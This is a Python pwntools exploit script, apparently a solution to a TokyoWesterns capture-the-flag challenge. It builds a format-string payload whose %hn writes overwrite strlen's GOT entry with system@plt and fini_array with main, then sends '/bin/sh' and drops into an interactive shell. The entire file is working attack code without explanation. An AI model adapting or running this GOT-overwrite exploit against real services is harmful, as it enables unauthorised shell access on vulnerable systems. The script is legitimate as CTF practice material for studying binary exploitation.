#!/usr/bin/python
from pwn import *

s = remote('127.0.0.1', 4000)
#s = remote('pwn2.chal.ctf.westerns.tokyo', 16317)

fini_array = 0x08049934
main = 0x080485ed
strlen_got = 0x08049a54
system_plt = 0x08048490

fmt = 'AA'
fmt += p32(strlen_got + 2) + p32(strlen_got) + p32(fini_array)
printed = 18+2+12

fmt += '%{}c%{}$hn'.format(0x0804-printed, 12)
printed = 0x0804

fmt += '%{}c%{}$hn'.format(0x8490-printed, 13)
printed = 0x8490

fmt += '%{}c%{}$hn'.format(0x85ed-printed, 14)

# order : 0x0804 0x8490 0x85ed

#print 'len(fmt) = ',len(fmt)

s.sendline(fmt)

########## return to main ##########

s.sendline('/bin/sh\x00')

s.interactive()
